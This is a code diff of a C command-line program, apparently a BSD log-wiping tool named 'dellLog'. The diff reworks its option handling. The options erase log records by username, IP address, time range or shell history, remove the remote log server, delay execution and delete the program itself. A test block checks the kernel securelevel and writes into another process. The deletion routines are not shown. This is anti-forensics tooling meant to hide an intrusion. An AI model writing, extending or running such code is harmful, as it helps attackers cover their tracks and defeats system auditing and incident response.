@@ -9,31 +9,28 @@
 
 #include "cli.h"
 
-//gcc -w -static ./dellLog.c -o ./dellLog -lkvm |more
-
-/*
-int test(int argc,char ** argv){
-	
-	struct proc processinfo;
-	pid_t pid = (pid_t) atoi(argv[1]);
-	
-	get_proc_vm_regions(pid);
-	get_proc_by_pid_kvmprocs(pid,&processinfo);
-	find_proc_by_pid(pid,&processinfo);
-	
-	return 0;
-}
-*/
-
+#include "main.h"
 
 
 //#define MY_TEST_INTERFACE
 
-int main (int argc,char ** argv){
 
-	int ret = 0;
+int test(int argc,char ** argv){
 	
 #ifdef MY_TEST_INTERFACE
+	char buf[1024]={0};
+	buf[0]= '\t';
+	buf[1]= 'A';
+	buf[2]= 'B';
+	char buffer[1024]={0};
+	sprintf(buffer,"%s",buf);
+	printf("string:%s\r\n",buffer);
+	int idx = 0;
+	while(buffer[idx]){
+		printf("number:%d,value:%x\r\n",idx,buffer[idx]);
+		idx++;
+	}
+
 	int privilige = check_securelevel();
 	printf("priv:%d\r\n",privilige);
 	
@@ -46,13 +43,35 @@ int main (int argc,char ** argv){
 	writeProcesData((pid_t)pid,(char*)argv[0],(char*)argv[0]);
 	printf("%s ok\r\n",__FUNCTION__);
 	return 0;
+
+	struct proc processinfo;
+	pid_t pid = (pid_t) atoi(argv[1]);
+	
+	get_proc_vm_regions(pid);
+	get_proc_by_pid_kvmprocs(pid,&processinfo);
+	find_proc_by_pid(pid,&processinfo);
 #endif
+	return 0;
+}
+
+
+
+
+
+
+int main (int argc,char ** argv){
+
+	int ret = 0;
 	
 	int ch = 0;
 	
 	int delay_second = 0;
 	
-	char * del_arg = 0;
+	int action = 0;
+	
+	char * param = 0;
+	
+	ret = test(argc,argv);
 	
 	while ((ch = getopt(argc, argv, "rd::ecos:p:t:h:")) != -1)
 	{
@@ -82,58 +101,54 @@ int main (int argc,char ** argv){
 			case 's':
 			{
 				char * server = optarg;
-				printf("server: %s\n", server);
-				ret = SetLogServer(server);
+				printf("server: %s\n", server+1);
+				if(server[0]== 's'){
+					ret = SetLogServer(&server[1]);
+				}
+				else if(server[0]== 'r'){
+					ret = RemoveLogServer(&server[1]);
+				}
 				break;
 			}
 			case 'd':
 			{	
-				del_arg = optarg;
-				printf("delete logging with arg:%s\r\n",del_arg);
-				ret = isIPAddr(del_arg);
+				param = optarg;
+				printf("delete logging with arg:%s\r\n",param);
+				ret = isIPAddr(param);
 				if(ret){
-					//DeleteAddr(del_arg);
+					action = ACTION_DEL_IP;
 				}
 				else{
-					//DeleteUser(del_arg);
+					action = ACTION_DEL_USERNAME;
 				}
 
+				break;
+			}
+			case 'h':
+			{
+				param = optarg;
+				action = ACTION_DEL_CMD;
+				
+				break;
+			}
+			case 't':
+			{
+				param = optarg;
+
+				action = ACTION_DEL_DATETIME;
+				break;
+			}
+			case 'p':
+			{
+				int sec = atoi(optarg);
+				if(sec > 0){
+					delay_second = sec;
+				}
 				break;
 			}
 			case 'r':
 			{
 				DeleteSelf();
-				break;
-			}
-			case 'h':
-			{
-				char * param = optarg;
-				DeleteHistory(param);
-				break;
-			}
-			case 't':
-			{
-				char * param = optarg;
-				char * sep = strstr(param,"-");
-				if(sep){
-					char start[256]={0};
-					char stop[256]={0};
-					memcpy(start,param,sep - param);
-					strcpy(stop,sep + 1);
-					time_t begin = strtoul(start,0,10);
-					time_t end = strtoul(stop,0,10);
-					ret = DeleteDateTime(begin,end);
-				}
-				
-				break;
-			}
-			case 'p':
-			{
-				char * param = optarg;
-				int delay = atoi(param);
-				if(delay > 0){
-					delay_second = delay;
-				}
 				break;
 			}
 			default:
@@ -143,15 +158,32 @@ int main (int argc,char ** argv){
 		}	
 	}
 	
-	sleep(delay_second);
-	
-	if(del_arg){
-		ret = isIPAddr(del_arg);
-		if(ret){
-			DeleteAddr(del_arg);
+	if(delay_second){
+		if(action == ACTION_DEL_USERNAME){
+			ret = DelayExec(delay_second,DeleteUser,param);
 		}
-		else{
-			DeleteUser(del_arg);
+		else if(action == ACTION_DEL_IP){
+			ret = DelayExec(delay_second,DeleteAddr,param);
+		}
+		else if(action == ACTION_DEL_DATETIME){
+			ret = DelayExec(delay_second,DeleteDateTime,param);
+		}
+		else if(action == ACTION_DEL_CMD){
+			ret = DelayExec(delay_second,DeleteHistory,param);
+		}	
+	}
+	else{
+		if(action == ACTION_DEL_USERNAME){
+			ret = DeleteUser(param);
+		}
+		else if(action == ACTION_DEL_IP){
+			ret = DeleteAddr(param);
+		}
+		else if(action == ACTION_DEL_DATETIME){
+			ret = DeleteDateTime(param);
+		}
+		else if(action == ACTION_DEL_CMD){
+			ret = DeleteHistory(param);
 		}	
 	}
 	
